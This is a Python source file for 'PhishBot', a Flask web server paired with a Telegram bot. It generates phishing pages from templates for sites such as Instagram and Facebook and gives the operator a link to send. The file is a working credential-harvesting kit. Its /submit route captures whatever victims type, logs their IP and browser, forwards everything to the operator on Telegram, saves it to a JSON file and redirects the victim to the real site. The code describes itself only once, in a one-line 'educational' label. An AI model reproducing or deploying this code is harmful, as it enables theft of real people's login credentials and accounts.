# Import necessary libraries
from flask import Flask, request, send_from_directory, redirect
import threading
import telebot
from telebot import types
import os
import json
from datetime import datetime
import shutil
import time
import logging
import glob
import re
from dotenv import load_dotenv

# Set up logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

load_dotenv()

# Telegram bot API token

API_TOKEN = os.getenv("API_TOKEN")
bot = telebot.TeleBot(API_TOKEN)  # Initialize Telegram bot
app = Flask(__name__, static_folder=None)  # Disable default static folder

# Global variables
bot_polling_thread = None
is_bot_running = False

# JSON file to store all credentials
CREDS_FILE = 'captured_credentials.json'


# Ensure the creds file exists
def initialize_creds_file():
    if not os.path.exists(CREDS_FILE):
        with open(CREDS_FILE, 'w') as f:
            json.dump({}, f)


# Directory for templates
TEMPLATES_DIR = "Templates"


# Function to get all available templates
def get_available_templates():
    templates = []
    # Look for all directories in the Templates folder using absolute path
    templates_dir = os.path.join(os.path.abspath(os.path.dirname(__file__)), TEMPLATES_DIR)
    if os.path.exists(templates_dir):
        template_dirs = [d for d in os.listdir(templates_dir)
                         if os.path.isdir(os.path.join(templates_dir, d))]

        for template in template_dirs:
            # Check if the template has an index.html file
            if os.path.exists(os.path.join(templates_dir, template, "index.html")):
                templates.append(template)

    return templates


# Dictionary to store user states if needed for multi-step operations
user_states = {}


# Ensure the directories exist
# Replace this:

# With this modern approach:
def create_directories():
    base_dir = os.path.abspath(os.path.dirname(__file__))
    os.makedirs(os.path.join(base_dir, "phished_pages"), exist_ok=True)
    os.makedirs(os.path.join(base_dir, TEMPLATES_DIR), exist_ok=True)
    initialize_creds_file()

# Then add this to register the function with Flask
with app.app_context():
    create_directories()



# Root route - Simple confirmation that the server is running
@app.route('/')
def home():
    return "🤖 Bot is running on Flask!"


# Route to check bot status
@app.route('/status')
def status():
    global is_bot_running
    templates = get_available_templates()
    return f"Bot running: {is_bot_running}, Flask is active, Available templates: {', '.join(templates)}"


# Route to serve static files (CSS, JS, images)
@app.route('/phish/<user_id>/<path:filename>')
def serve_static(user_id, filename):
    base_dir = os.path.abspath(os.path.dirname(__file__))
    folder = os.path.join(base_dir, "phished_pages", user_id)
    logger.info(f"Serving static file: {filename} from folder: {folder}")
    return send_from_directory(folder, filename)


# Route to serve the phishing page to victims
@app.route('/phish/<user_id>')
def serve_phish_page(user_id):
    base_dir = os.path.abspath(os.path.dirname(__file__))
    folder = os.path.join(base_dir, "phished_pages", user_id)
    logger.info(f"Attempting to serve page from folder: {folder}")
    logger.info(f"Current working directory: {os.getcwd()}")
    
    if os.path.exists(os.path.join(folder, "index.html")):
        logger.info("Found index.html file")
        try:
            return send_from_directory(folder, "index.html")
        except Exception as e:
            logger.error(f"Error serving index.html: {e}")
            return f"Error serving page: {str(e)}", 500
    logger.error(f"Page not found in folder: {folder}")
    return "Page not found", 404


# Route to handle form submissions from phishing pages
# Updated to handle both GET and POST methods
@app.route('/submit/<user_id>', methods=['GET', 'POST'])
def capture_creds(user_id):
    # Extract all form fields submitted by victim
    if request.method == 'POST':
        creds = request.form.to_dict()
    else:  # GET method
        creds = request.args.to_dict()

    # Add timestamp and IP for tracking
    creds['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    creds['ip'] = request.remote_addr
    creds['user_agent'] = request.headers.get('User-Agent', 'Unknown')
    creds['method'] = request.method

    # Format credentials as text for Telegram message
    msg = "\n".join(f"{k}: {v}" for k, v in creds.items())

    try:
        # Send credentials to attacker via Telegram
        bot.send_message(user_id, f"🛑 Credentials Captured:\n\n{msg}")
    except Exception as e:
        logger.error(f"Error sending Telegram message: {e}")

    # Save credentials to JSON file
    save_credentials(user_id, creds)

    # Response to victim's browser - redirect to a common site
    redirect_url = "https://www.instagram.com"
    if "instagram" in creds.get('template', '').lower():
        redirect_url = "https://www.instagram.com"
    elif "facebook" in creds.get('template', '').lower():
        redirect_url = "https://www.facebook.com"

    return redirect(redirect_url)


# Function to save credentials to JSON file
def save_credentials(user_id, creds):
    try:
        # Load existing data
        with open(CREDS_FILE, 'r') as f:
            all_creds = json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        all_creds = {}

    # Add credentials to user's collection
    if user_id not in all_creds:
        all_creds[user_id] = []

    all_creds[user_id].append(creds)

    # Save updated data
    with open(CREDS_FILE, 'w') as f:
        json.dump(all_creds, f, indent=2)


# Command handler for /start and /help
@bot.message_handler(commands=['start', 'help'])
def send_welcome(message):
    bot.reply_to(message, (
        "🎣 Welcome to PhishBot!\n\n"
        "Commands:\n"
        "/fish - Start phishing\n"
        "/templates - List available templates\n"
        "/info - About\n"
        "/history - View your captured credentials"
    ))


# Command handler for /info
@bot.message_handler(commands=['info'])
def send_info(message):
    bot.reply_to(message, "Educational phishing simulator.")


# Command handler for /templates
@bot.message_handler(commands=['templates'])
def list_templates(message):
    templates = get_available_templates()
    if templates:
        template_list = "\n".join([f"• {template}" for template in templates])
        bot.send_message(message.chat.id, f"📋 Available templates:\n\n{template_list}\n\nUse /fish to select one.")
    else:
        bot.send_message(message.chat.id, "❌ No templates found. Please add templates to the Templates directory.")


# Command handler for viewing credential history
@bot.message_handler(commands=['history'])
def view_history(message):
    user_id = str(message.chat.id)

    try:
        with open(CREDS_FILE, 'r') as f:
            all_creds = json.load(f)

        if user_id in all_creds and all_creds[user_id]:
            # User has captured credentials
            count = len(all_creds[user_id])
            bot.send_message(user_id, f"📊 You have captured {count} credential set(s).")

            # Send the most recent 5 captures
            recent = all_creds[user_id][-5:]
            for i, cred in enumerate(recent):
                # Format each credential set
                msg = "\n".join(f"{k}: {v}" for k, v in cred.items())
                bot.send_message(user_id, f"📝 Capture {i + 1}:\n\n{msg}")
        else:
            # No credentials captured yet
            bot.send_message(user_id, "📭 You haven't captured any credentials yet.")
    except (FileNotFoundError, json.JSONDecodeError):
        bot.send_message(user_id, "📭 No credentials history found.")


# Command handler for /fish
@bot.message_handler(commands=['fish'])
def send_fish_menu(message):
    # Get available templates
    templates = get_available_templates()

    if not templates:
        bot.send_message(message.chat.id, "❌ No templates found. Please add templates to the Templates directory.")
        return

    # Create a custom keyboard with template options
    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True, one_time_keyboard=True)
    buttons = [types.KeyboardButton(template) for template in templates]
    markup.add(*buttons)
    bot.send_message(message.chat.id, "📄 Choose a phishing template:", reply_markup=markup)


# Message handler for template selection
@bot.message_handler(func=lambda msg: msg.text in get_available_templates())
def handle_template_selection(message):
    template = message.text
    user_id = str(message.chat.id)
    bot.send_message(message.chat.id, f"⚙️ Generating phishing page for {template}...")

    # Get absolute paths
    base_dir = os.path.abspath(os.path.dirname(__file__))
    template_dir = os.path.join(base_dir, TEMPLATES_DIR, template)
    output_path = os.path.join(base_dir, "phished_pages", user_id)

    # Remove existing files if any
    if os.path.exists(output_path):
        try:
            shutil.rmtree(output_path)
            logger.info(f"Removed existing directory: {output_path}")
        except Exception as e:
            logger.error(f"Error removing existing directory: {e}")

    try:
        # Create fresh directory
        os.makedirs(output_path, exist_ok=True)
        logger.info(f"Created directory: {output_path}")

        # Copy all files from template directory
        if os.path.exists(template_dir):
            # First copy index.html
            index_src = os.path.join(template_dir, "index.html")
            index_dst = os.path.join(output_path, "index.html")
            if os.path.exists(index_src):
                shutil.copy2(index_src, index_dst)
                logger.info(f"Copied index.html to {index_dst}")

                # Now copy any other assets
                for item in os.listdir(template_dir):
                    if item != "index.html":
                        src = os.path.join(template_dir, item)
                        dst = os.path.join(output_path, item)
                        if os.path.isfile(src):
                            shutil.copy2(src, dst)
                            logger.info(f"Copied asset {item}")
                        elif os.path.isdir(src):
                            shutil.copytree(src, dst, dirs_exist_ok=True)
                            logger.info(f"Copied directory {item}")

                # Add template info for tracking
                with open(os.path.join(output_path, "template_info.txt"), 'w') as f:
                    f.write(template)

                # Prepare the phishing page with the user_id
                if prepare_phishing_page(index_dst, index_dst, user_id, template):
                    phishing_url = f"https://notafish.onrender.com/phish/{user_id}"
                    bot.send_message(message.chat.id, f"✅ Done!\nSend this link:\n{phishing_url}")
                else:
                    bot.send_message(message.chat.id, "❌ Failed to prepare phishing page.")
            else:
                bot.send_message(message.chat.id, f"❌ Template index.html not found in {template_dir}")
        else:
            bot.send_message(message.chat.id, f"❌ Template directory not found: {template_dir}")
    except Exception as e:
        logger.error(f"Error in template selection: {e}")
        bot.send_message(message.chat.id, f"❌ Error: {str(e)}")


# Updated function to modify HTML file to keep the form method and add user_id to action
def prepare_phishing_page(template_path, output_path, user_id, template_name):
    try:
        logger.info(f"Preparing phishing page. Template path: {template_path}")
        logger.info(f"Output path: {output_path}")
        
        # Read the template HTML
        with open(template_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read()

        # Replace the USER_ID_PLACEHOLDER with the actual user_id
        content = content.replace('USER_ID_PLACEHOLDER', user_id)

        # Write the modified content to the output path
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(content)

        logger.info(f"Successfully prepared phishing page for {template_name} with user_id {user_id}")
        return True
    except Exception as e:
        logger.error(f"Error preparing phishing page: {e}")
        return False


# Default message handler for unrecognized commands
@bot.message_handler(func=lambda m: True)
def fallback(m):
    bot.reply_to(m, "❓ Unknown command. Use /start")


# Function to safely run the Telegram bot with error handling
def run_bot_with_error_handling():
    global is_bot_running

    if is_bot_running:
        logger.warning("Bot is already running, skipping...")
        return

    is_bot_running = True
    logger.info("Starting bot polling...")

    try:
        bot.remove_webhook()
        time.sleep(0.5)  # Give time for webhook to be removed
        bot.infinity_polling(timeout=60, long_polling_timeout=30)
    except Exception as e:
        logger.error(f"Bot polling error: {e}")
    finally:
        is_bot_running = False
        logger.info("Bot polling has stopped")


# Main entry point
if __name__ == '__main__':
    # Get the absolute base path
    BASE_DIR = os.path.abspath(os.path.dirname(__file__))
    
    # Initialize credentials file
    initialize_creds_file()

    # Create directories if they don't exist with absolute paths
    os.makedirs(os.path.join(BASE_DIR, "phished_pages"), exist_ok=True)
    os.makedirs(os.path.join(BASE_DIR, TEMPLATES_DIR), exist_ok=True)

    # List available templates on startup
    templates = get_available_templates()
    logger.info(f"Available templates: {templates}")
    logger.info(f"Base directory: {BASE_DIR}")
    logger.info(f"Templates directory: {os.path.join(BASE_DIR, TEMPLATES_DIR)}")
    logger.info(f"Phished pages directory: {os.path.join(BASE_DIR, 'phished_pages')}")

    # Try to stop any existing bot instances
    try:
        bot.remove_webhook()
        time.sleep(1)  # Give time for webhook to be removed
    except Exception as e:
        logger.error(f"Error removing webhook: {e}")

    # Start the bot in a separate thread with better error handling
    bot_polling_thread = threading.Thread(target=run_bot_with_error_handling)
    bot_polling_thread.daemon = True  # Make thread die when main thread exits
    bot_polling_thread.start()

    # Get port from environment variable (for Render compatibility)
    port = int(os.environ.get("PORT", 5000))

    # Start Flask web server
    app.run(host='0.0.0.0', port=port)